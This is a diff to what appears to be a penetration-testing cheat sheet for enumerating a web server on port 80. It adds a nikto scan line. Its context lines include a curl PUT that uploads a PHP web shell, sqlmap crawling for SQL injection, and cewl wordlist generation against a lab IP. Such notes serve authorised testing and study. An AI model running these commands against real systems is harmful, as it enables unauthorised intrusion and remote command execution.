@@ -105,6 +105,7 @@
 ### Enumeratng port 80
   
     nikto -h http://192.168.1.10/
+    nikto -host http://SERVER_IP/ -C all -output Apache.html -Format HTML 
     curl -v -X PUT -d '<?php shell_exec($_GET["cmd"]); ?>' http://192.168.1.10/shell.php
     sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
     cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
